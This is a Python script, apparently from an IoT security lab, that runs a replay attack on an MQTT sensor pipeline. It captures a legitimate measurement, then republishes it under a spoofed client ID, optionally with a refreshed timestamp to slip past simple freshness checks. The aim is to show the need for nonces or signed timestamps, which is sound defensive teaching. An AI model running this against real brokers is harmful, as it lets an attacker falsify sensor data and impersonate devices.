"""
A3 — Replay Attack (rejeu de message capturé)
CocoaSecure IoT Platform

Objectif :
1. Capturer un message MQTT légitime publié par un vrai cycle Node-RED
   (mode "capture")
2. Rejouer ce même message plus tard, à l'identique ou avec un timestamp
   modifié, pour usurper l'identité d'un capteur et faire croire à une
   nouvelle mesure valide (mode "replay")

Ce scénario illustre une faille que la simple détection par seuils métier
(node "Analyse des mesures") ne peut PAS détecter : le message rejoué est
parfaitement valide sur le plan des valeurs, puisque c'est une vraie mesure
déjà acceptée. Seule une protection anti-replay (nonce, timestamp strict,
ou vérification d'unicité) peut la bloquer.

Usage :
    pip install paho-mqtt

    # Terminal 1 : capturer un message légitime (attend le prochain message normal)
    python A3_replay.py --mode capture

    # Terminal 2 (plus tard) : rejouer le message capturé
    python A3_replay.py --mode replay --file captured_message.json
    python A3_replay.py --mode replay --file captured_message.json --fresh-timestamp
"""

import json
import time
import argparse
from datetime import datetime, timezone
from paho.mqtt import client as mqtt_client

BROKER_HOST = "localhost"
BROKER_PORT = 1883
TOPIC = "cacao/sanpedro/measurements"
CLIENT_ID = "esp32-attacker-replay"
CAPTURE_FILE_DEFAULT = "captured_message.json"


# ─────────────────────────────────────────────────────────────
# MODE CAPTURE — s'abonne et sauvegarde le premier message légitime reçu
# ─────────────────────────────────────────────────────────────
def run_capture(output_file: str):
    captured = {"done": False}

    def on_connect(client, userdata, flags, rc, properties=None):
        if rc == 0:
            print(f"[A3-CAPTURE] Connecté, en écoute sur '{TOPIC}'...")
            print("[A3-CAPTURE] En attente d'un message légitime "
                  "(déclencher un inject Node-RED ou attendre le cycle auto)")
            client.subscribe(TOPIC, qos=1)
        else:
            print(f"[A3-CAPTURE] Échec de connexion, code={rc}")

    def on_message(client, userdata, msg):
        if captured["done"]:
            return

        try:
            payload = json.loads(msg.payload.decode())
        except json.JSONDecodeError:
            print("[A3-CAPTURE] Message reçu non-JSON, ignoré.")
            return

        # On ne capture que des mesures "normales" pour un replay convaincant
        if payload.get("simulationType") not in ("NORMAL", None):
            print(f"[A3-CAPTURE] Message ignoré (type={payload.get('simulationType')}), "
                  f"on attend une mesure normale...")
            return

        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)

        print(f"\n[A3-CAPTURE] Message légitime capturé et sauvegardé -> {output_file}")
        print(f"[A3-CAPTURE] deviceId={payload.get('deviceId')}  "
              f"site={payload.get('site')}  timestamp={payload.get('timestamp')}")
        print("[A3-CAPTURE] Ce message peut maintenant être rejoué avec --mode replay\n")

        captured["done"] = True
        client.disconnect()

    client = mqtt_client.Client(client_id=CLIENT_ID + "-capture",
                                 callback_api_version=mqtt_client.CallbackAPIVersion.VERSION2)
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)

    client.loop_start()
    timeout = time.time() + 120  # 2 minutes max d'attente
    while not captured["done"] and time.time() < timeout:
        time.sleep(0.5)

    if not captured["done"]:
        print("[A3-CAPTURE] Timeout — aucun message légitime capturé en 2 minutes. "
              "Déclenche un envoi manuel dans Node-RED et relance.")

    client.loop_stop()


# ─────────────────────────────────────────────────────────────
# MODE REPLAY — rejoue un message précédemment capturé
# ─────────────────────────────────────────────────────────────
def run_replay(input_file: str, fresh_timestamp: bool, repeat: int, interval: float):
    with open(input_file, "r", encoding="utf-8") as f:
        payload = json.load(f)

    print(f"[A3-REPLAY] Message chargé depuis {input_file}")
    print(f"[A3-REPLAY] deviceId original = {payload.get('deviceId')}  "
          f"timestamp original = {payload.get('timestamp')}")

    def on_connect(client, userdata, flags, rc, properties=None):
        if rc == 0:
            print(f"[A3-REPLAY] Connecté au broker en tant que '{CLIENT_ID}' (usurpation)")
        else:
            print(f"[A3-REPLAY] Échec de connexion, code={rc}")

    client = mqtt_client.Client(client_id=CLIENT_ID,
                                 callback_api_version=mqtt_client.CallbackAPIVersion.VERSION2)
    client.on_connect = on_connect
    client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    client.loop_start()
    time.sleep(1)

    for i in range(1, repeat + 1):
        replay_payload = dict(payload)  # copie pour ne pas modifier le fichier source
        replay_payload["anomalyType"] = "A3_REPLAY_ATTACK"

        if fresh_timestamp:
            # Variante "sophistiquée" : l'attaquant met à jour le timestamp
            # pour tenter de passer une éventuelle vérification de fraîcheur naïve
            replay_payload["timestamp"] = datetime.now(timezone.utc).isoformat()
            print(f"[A3-REPLAY] Rejeu {i}/{repeat} avec timestamp rafraîchi "
                  f"(contournement d'une vérif de fraîcheur simple)")
        else:
            print(f"[A3-REPLAY] Rejeu {i}/{repeat} à l'identique "
                  f"(timestamp original conservé — devrait être détecté par "
                  f"une vérif d'unicité/nonce)")

        client.publish(TOPIC, json.dumps(replay_payload), qos=1)
        time.sleep(interval)

    print("\n[A3-REPLAY] Rejeu terminé.")
    print("[A3-REPLAY] Constat attendu : le pipeline actuel (seuils métier uniquement) "
          "accepte ce message comme une mesure normale car les valeurs sont plausibles. "
          "=> Preuve que la détection par seuils ne suffit pas contre le replay ; "
          "il faut une protection dédiée (nonce unique, TTL strict, ou horodatage signé).")

    client.loop_stop()
    client.disconnect()


def main():
    parser = argparse.ArgumentParser(description="A3 — Replay Attack")
    parser.add_argument("--mode", choices=["capture", "replay"], required=True)
    parser.add_argument("--file", default=CAPTURE_FILE_DEFAULT,
                         help="fichier de capture (lecture en replay, écriture en capture)")
    parser.add_argument("--fresh-timestamp", action="store_true",
                         help="(replay) rafraîchir le timestamp pour simuler un attaquant plus habile")
    parser.add_argument("--repeat", type=int, default=3, help="(replay) nombre de rejeux")
    parser.add_argument("--interval", type=float, default=2.0, help="(replay) secondes entre rejeux")
    args = parser.parse_args()

    if args.mode == "capture":
        run_capture(args.file)
    else:
        run_replay(args.file, args.fresh_timestamp, args.repeat, args.interval)


if __name__ == "__main__":
    main()
